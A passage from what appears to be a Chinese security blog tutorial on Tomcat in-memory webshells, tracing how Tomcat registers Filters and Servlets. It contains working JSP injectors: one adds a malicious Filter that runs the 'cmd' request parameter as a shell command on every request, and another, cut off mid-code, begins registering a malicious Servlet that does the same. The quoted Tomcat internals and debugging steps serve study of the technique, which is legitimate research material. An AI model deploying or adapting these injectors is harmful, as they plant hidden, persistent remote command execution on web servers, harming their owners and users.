class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 添加FilterMap</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 反射获取ApplicationFilterConfig对象，往filterConfigs中放入filterConfig</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>可能大家从上往下看唯一疑惑的就是<code> filterMap.setDispatcher(DispatcherType.REQUEST.name());</code>，这一句话在上文中没有提及，因为这里其实是一个坑点：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673257770530-bd2e2cb8-44a9-4afd-865f-a2b708fae0e1.png#averageHue=%23687c6b&clientId=u05a7cc66-79ba-4&from=paste&height=489&id=u320dfa04&name=image.png&originHeight=611&originWidth=1461&originalType=binary&ratio=1&rotation=0&showTitle=false&size=184006&status=done&style=none&taskId=u33b42afc-c731-4e9a-a84a-8ece58c346d&title=&width=1168.8" alt="image.png"><br>在filterMap中有一个dispatcherMapping属性：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673257797785-18ca8093-d7f7-4696-98b0-720eba710330.png#averageHue=%232d2c2c&clientId=u05a7cc66-79ba-4&from=paste&height=439&id=u4eb1d6c9&name=image.png&originHeight=549&originWidth=973&originalType=binary&ratio=1&rotation=0&showTitle=false&size=103674&status=done&style=none&taskId=u39145023-90a7-47e8-9777-b6e2c7d5de0&title=&width=778.4" alt="image.png"><br>在这里只需要设置为REQUEST即可<br>之后访问内存马：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673258049702-512026e7-4225-4087-a71c-26c56c2c776a.png#averageHue=%23eaca91&clientId=u05a7cc66-79ba-4&from=paste&height=103&id=ue14c0cb5&name=image.png&originHeight=129&originWidth=1106&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7416&status=done&style=none&taskId=ubf628048-6612-429d-b46a-ee398a11818&title=&width=884.8" alt="image.png"><br>注入成功：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673258105495-1631240c-cd85-4e5e-b4a5-97512e497562.png#averageHue=%23fafafa&clientId=u05a7cc66-79ba-4&from=paste&height=190&id=u64c06fce&name=image.png&originHeight=237&originWidth=800&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9490&status=done&style=none&taskId=ud2d820fc-162d-42d1-afd5-ca8388cfe27&title=&width=640" alt="image.png"><br>到此告一段落拉~</p>
<h1 id="x2F-Servlet型内存马"><a href="#x2F-Servlet型内存马" class="headerlink" title="&#x2F;Servlet型内存马"></a>&#x2F;Servlet型内存马</h1><p>妈的插一嘴啊，本来是打算赶紧写完Servlet的分析的，但是中途看到了个Tomcat回显技术，给我又整过去看那个了，没办法只能一起写了，知识真的是越看越多妈的比<br>按照正常的流程，FIlter过后就是Servlet拉~<br>写一个正常的servlet：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kino;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testservlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注册一下xml</p>
<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>在org.apache.catalina.core.StandardContext类的startInternal()方法中，我们能看到Listener-&gt;Filter-&gt;Servlet的加载顺序：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                checkConstraintsForUncoveredMethods(findConstraints());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// Start manager</span></span><br><span class="line">                <span class="type">Manager</span> <span class="variable">manager</span> <span class="operator">=</span> getManager();</span><br><span class="line">                <span class="keyword">if</span> (manager <span class="keyword">instanceof</span> Lifecycle) &#123;</span><br><span class="line">                    ((Lifecycle) manager).start();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                log.error(sm.getString(<span class="string">&quot;standardContext.managerFail&quot;</span>), e);</span><br><span class="line">                ok = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Configure and call application filters</span></span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!filterStart()) &#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.filterFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Load and initialize all &quot;load on startup&quot; servlets</span></span><br><span class="line">            <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!loadOnStartup(findChildren()))&#123;</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.servletFail&quot;</span>));</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Start ContainerBackgroundProcessor thread</span></span><br><span class="line">            <span class="built_in">super</span>.threadStart();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// Unbinding thread</span></span><br><span class="line">            unbindThread(oldCCL);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="创建StandardWrapper"><a href="#创建StandardWrapper" class="headerlink" title="创建StandardWrapper"></a>创建StandardWrapper</h2><p>在StandardContext#startInternal中，调用了fireLifecycleEvent()方法解析web.xml文件，我们在此下断点跟进：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673345813102-0c90dbd3-40b1-40af-ae30-ff6baf364b76.png#averageHue=%23575541&clientId=u4cfed74f-2f1c-4&from=paste&height=252&id=u9a55d0fc&name=image.png&originHeight=315&originWidth=1333&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60911&status=done&style=none&taskId=u56c35f0e-8d03-4e91-806a-e315c7f5856&title=&width=1066.4" alt="image.png"><br>在<code>ContextConfig#webConfig()</code>解析了xml文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673346029528-5c044390-7c93-45d3-acad-51810b17c64f.png#averageHue=%233d4246&clientId=u4cfed74f-2f1c-4&from=paste&height=214&id=u55854df2&name=image.png&originHeight=268&originWidth=1247&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68439&status=done&style=none&taskId=u16923e81-5dc8-4542-86c9-015b5ddd626&title=&width=997.6" alt="image.png"><br>随之在WebConfig中调用了configureContext：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673346147747-78c63dd6-d834-41c7-b5a3-3aa417811df6.png#averageHue=%23736147&clientId=u4cfed74f-2f1c-4&from=paste&height=113&id=udd931738&name=image.png&originHeight=141&originWidth=1091&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21833&status=done&style=none&taskId=u07a99790-6a58-4b02-ae39-02db1b3b58d&title=&width=872.8" alt="image.png"><br>跟进这个函数看看做了什么：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">.........</span><br><span class="line">        <span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line">            <span class="comment">//创建StandardWrapper对象</span></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">            <span class="comment">// Description is ignored</span></span><br><span class="line">            <span class="comment">// Display name is ignored</span></span><br><span class="line">            <span class="comment">// Icons are ignored</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// jsp-file gets passed to the JSP Servlet as an init-param</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//设置LoadOnStartup属性</span></span><br><span class="line"></span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//设置ServletName属性</span></span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line">             <span class="comment">//设置ServletClass属性</span></span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            <span class="type">MultipartDef</span> <span class="variable">multipartdef</span> <span class="operator">=</span> servlet.getMultipartDef();</span><br><span class="line">            <span class="keyword">if</span> (multipartdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxFileSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">long</span> <span class="variable">maxRequestSize</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">fileSizeThreshold</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxFileSize()) &#123;</span><br><span class="line">                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getMaxRequestSize()) &#123;</span><br><span class="line">                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">null</span> != multipartdef.getFileSizeThreshold()) &#123;</span><br><span class="line">                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                wrapper.setMultipartConfigElement(<span class="keyword">new</span> <span class="title class_">MultipartConfigElement</span>(</span><br><span class="line">                        multipartdef.getLocation(),</span><br><span class="line">                        maxFileSize,</span><br><span class="line">                        maxRequestSize,</span><br><span class="line">                        fileSizeThreshold));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getAsyncSupported() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setAsyncSupported(</span><br><span class="line">                        servlet.getAsyncSupported().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line">             <span class="comment">//将包装好的StandWrapper添加进ContainerBase的children属性中</span></span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>最后用了<code>context.addServletMappingDecoded</code>加了对应的路由：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673348550509-384b3f47-e706-4437-871f-d32f324055f7.png#averageHue=%232e2b2a&clientId=u4cfed74f-2f1c-4&from=paste&height=198&id=uf697ef4d&name=image.png&originHeight=247&originWidth=1323&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48703&status=done&style=none&taskId=u446c4912-d073-432f-9682-abdf47f9043&title=&width=1058.4" alt="image.png"></p>
<h2 id="加载StandWrapper"><a href="#加载StandWrapper" class="headerlink" title="加载StandWrapper"></a>加载StandWrapper</h2><p>最后在StandradContext的findChilren获取了StandradWrapper类：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673348794289-907d42f0-7b24-4920-b40c-dfb63b631589.png#averageHue=%23798b7b&clientId=u4cfed74f-2f1c-4&from=paste&height=135&id=u5068f110&name=image.png&originHeight=169&originWidth=1363&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46263&status=done&style=none&taskId=u54af2b63-41ca-448a-816f-3c9ebbee972&title=&width=1090.4" alt="image.png"><br>回到一开始说的加载完Listen,filter就该servlet了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673348902663-9f679a67-fff8-4b0f-9e39-13d125e6c092.png#averageHue=%232c2c2b&clientId=u4cfed74f-2f1c-4&from=paste&height=152&id=u69dc74e3&name=image.png&originHeight=190&originWidth=1157&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30663&status=done&style=none&taskId=uef10605d-b4c4-410a-a872-e78ea92c991&title=&width=925.6" alt="image.png"><br>通过loadOnstartup()方法加载我们的wrapper</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span></span><br><span class="line">    TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;</span><br><span class="line">        <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line">        <span class="comment">//判断属性loadOnStartup的值，因此这里应该大于0</span></span><br><span class="line">        <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">        ArrayList&lt;Wrapper&gt; list = map.get(key);</span><br><span class="line">        <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</span><br><span class="line">            list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            map.put(key, list);</span><br><span class="line">        &#125;</span><br><span class="line">        list.add(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">    <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wrapper.load();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">                getLogger().error(sm.getString(<span class="string">&quot;standardContext.loadOnStartup.loadException&quot;</span>,</span><br><span class="line">                      getName(), wrapper.getName()), StandardWrapper.getRootCause(e));</span><br><span class="line">                <span class="comment">// <span class="doctag">NOTE:</span> load errors (including a servlet that throws</span></span><br><span class="line">                <span class="comment">// UnavailableException from the init() method) are NOT</span></span><br><span class="line">                <span class="comment">// fatal to application startup</span></span><br><span class="line">                <span class="comment">// unless failCtxIfServletStartFails=&quot;true&quot; is specified</span></span><br><span class="line">                <span class="keyword">if</span>(getComputedFailCtxIfServletStartFails()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面有个判断loadOnStartup的值需要大于0才会继续去加载,这里的loadOnStartup对应servlet的懒加载机制（通过注解来设置路由等等），默认值为-1，此时只有当servlet被调用时Servlet才会被加载到内存中<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1673349078414-909ef7f3-1c9d-4346-9b37-bba819e1c452.png#averageHue=%23897543&clientId=u4cfed74f-2f1c-4&from=paste&height=105&id=ua9916152&name=image.png&originHeight=131&originWidth=1342&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28885&status=done&style=none&taskId=uf2ebee3d-1b45-43bc-b068-b1cd515ea74&title=&width=1073.6" alt="image.png"></p>
<h2 id="内存马——动态注册Servlet-参考枫师傅）"><a href="#内存马——动态注册Servlet-参考枫师傅）" class="headerlink" title="内存马——动态注册Servlet(参考枫师傅）"></a>内存马——动态注册Servlet(参考枫师傅）</h2><p>通过上文的分析我们能够总结出创建Servlet的流程</p>
<ol>
<li>获取StandardContext对象</li>
<li>编写恶意Servlet</li>
<li>通过StandardContext.createWrapper()创建StandardWrapper对象</li>
<li>设置StandardWrapper对象的loadOnStartup属性值</li>
<li>设置StandardWrapper对象的ServletName属性值</li>
<li>设置StandardWrapper对象的ServletClass属性值</li>
<li>将StandardWrapper对象添加进StandardContext对象的children属性中</li>
<li>通过StandardContext.addServletMappingDecoded()添加对应的路径映射<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">				<span class="comment">//获取StandardContext</span></span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line"> <span class="comment">//编写恶意的Servlet</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span 